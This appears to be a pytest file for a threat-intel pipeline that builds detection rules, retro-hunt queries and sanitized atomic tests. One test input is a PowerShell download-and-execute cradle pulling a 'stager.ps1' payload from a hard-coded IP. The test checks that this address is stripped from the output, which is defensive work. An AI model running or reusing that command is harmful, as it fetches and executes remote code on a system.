"""Stack matching, CVSS parse, Wazuh/LimaCharlie, atomic sanitization, retro-hunt."""

from __future__ import annotations

from pipeline.atomic import TEST_IP, TEST_URL, generate_atomic_tests
from pipeline.extract import load_sample_extraction
from pipeline.hunt import build_retro_hunts
from pipeline.ossiem import build_limacharlie_yaml, build_wazuh_xml
from pipeline.profile import match_stack, parse_cvss
from pipeline.sigma_build import build_sigma_yaml
from pipeline.webhooks import should_notify
import yaml


def test_stack_match_iis_vs_cisco():
    intel = load_sample_extraction()
    hit = match_stack(intel.affected, ["iis", "windows-server-2022"], intel.summary)
    miss = match_stack(intel.affected, ["cisco-asa", "sap"], intel.summary)
    empty = match_stack(intel.affected, [], intel.summary)
    assert hit["matched"] is True
    assert miss["matched"] is False
    assert empty["configured"] is False


def test_cvss_parse_and_notify_gate():
    assert parse_cvss("9.8") == 9.8
    assert should_notify(cvss=9.8, matched=True, profile_configured=True) is True
    assert should_notify(cvss=4.0, matched=True, profile_configured=True) is False
    assert should_notify(cvss=9.8, matched=False, profile_configured=True) is False
    assert should_notify(cvss=9.8, matched=False, profile_configured=False, only_matches=False) is True


def test_wazuh_and_limacharlie_from_sample():
    intel = load_sample_extraction()
    yaml_text = build_sigma_yaml(intel, ["https://example.test"])
    detection = yaml.safe_load(yaml_text)["detection"]
    wazuh = build_wazuh_xml(
        title=intel.sigma.title,
        description=intel.summary,
        detection=detection,
        techniques=intel.techniques,
        seed="sample",
        level="high",
    )
    assert "<rule" in wazuh
    assert "win.eventdata" in wazuh
    lc = build_limacharlie_yaml(title=intel.sigma.title, detection=detection, seed="sample")
    assert "NEW_PROCESS" in lc
    assert "enabled: false" in lc.lower() or "false" in lc


def test_atomic_sanitizes_c2():
    tests = generate_atomic_tests(
        techniques=[{"id": "T1059.001", "name": "PowerShell"}],
        command_lines=[
            "powershell.exe -Enc IEX (New-Object Net.WebClient).DownloadString('http://185.244.214.77/stager.ps1')"
        ],
        process_anomalies=[],
        logsource_product="windows",
    )
    blob = "\n".join(t["command"] for t in tests)
    assert "185.244.214.77" not in blob
    assert TEST_IP in blob or TEST_URL in blob
    assert any("Invoke-AtomicTest T1059.001" in t["command"] for t in tests)


def test_retro_hunt_window():
    hunts = build_retro_hunts(
        splunk_spl='ParentImage="*\\\\w3wp.exe"',
        sentinel_kql="DeviceProcessEvents | where FileName == 'cmd.exe'",
        windows=90,
    )
    assert "earliest=-90d" in hunts["splunk"]
    assert "ago(90d)" in hunts["sentinel"]
